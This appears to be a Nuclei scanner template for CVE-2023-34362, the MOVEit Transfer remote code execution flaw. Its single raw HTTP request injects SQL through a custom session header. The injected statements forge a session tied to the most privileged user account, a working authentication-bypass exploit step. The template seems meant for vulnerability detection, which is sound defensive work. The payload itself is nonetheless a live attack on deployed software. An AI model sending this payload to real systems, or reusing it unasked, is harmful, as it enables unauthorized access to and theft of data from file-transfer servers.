id: CVE-2023-34362

info:
  name: MOVEit Transfer - Remote Code Execution
  author: princechaddha,rootxharsh,ritikchaddha,pdresearch
  severity: critical
variables:
  sessioncookie: "{{randstr}}"
  ips: "127.0.0.1"

http:
  - raw:
      - |
        POST /moveitisapi/moveitisapi.dll?action=m2 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.26.0
        Accept-Encoding: gzip, deflate
        Accept: */*
        Ax-silock-transaction: folder_add_by_path
        X-siLock-Transaction: session_setvars
        X-siLock-SessVar0: MyPkgID: 0
        X-siLock-SessVar1: MyPkgSelfProvisionedRecips: SQL Injection'); INSERT INTO activesessions (SessionID) values ('{{sessioncookie}}');UPDATE activesessions SET Username=(select Username from users order by permission desc limit 1) WHERE SessionID='{{sessioncookie}}';UPDATE activesessions SET LoginName='test@test.com' WHERE SessionID='{{sessioncookie}}';UPDATE activesessions SET RealName='test@test.com' WHERE SessionID='{{sessioncookie}}';UPDATE activesessions SET InstId='1234' WHERE SessionID='{{sessioncookie}}';UPDATE activesessions SET IpAddress='{{ips}}' WHERE SessionID='{{sessioncookie}}';UPDATE activesessions SET LastTouch='2099-06-10 09:30:00' WHERE SessionID='{{sessioncookie}}';UPDATE activesessions SET DMZInterface='10' WHERE SessionID='{{sessioncookie}}';UPDATE activesessions SET Timeout='60' WHERE SessionID='{{sessioncookie}}';UPDATE activesessions SET ResilNode='10' WHERE SessionID='{{sessioncookie}}';UPDATE activesessions SET AcctReady='1' WHERE SessionID='{{sessioncookie}}'; -- asdf
        Cookie: siLockLongTermInstID=0
        Content-Length: 0
    matchers:
      - type: status
        status:
          - 403

